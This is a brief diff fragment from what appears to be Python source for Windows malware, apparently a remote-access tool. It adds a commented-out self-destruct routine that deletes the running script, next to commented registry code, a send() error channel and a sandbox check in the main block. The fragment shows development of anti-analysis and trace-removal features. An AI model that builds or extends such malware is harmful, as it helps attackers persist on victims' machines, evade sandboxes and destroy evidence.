@@ -905,6 +905,13 @@ import winreg as reg
 #     except Exception as e:
 #         send(f"Error adding to registry: {e}")
 
+# def self_destruct():
+#     try:
+#         file_path = os.path.abspath(sys.argv[0])
+#         os.remove(file_path)
+#     except Exception as e:
+#         send(f"Error during self-destruction: {e}")
+
 if __name__ == '__main__':
     try:
         if is_sandbox():
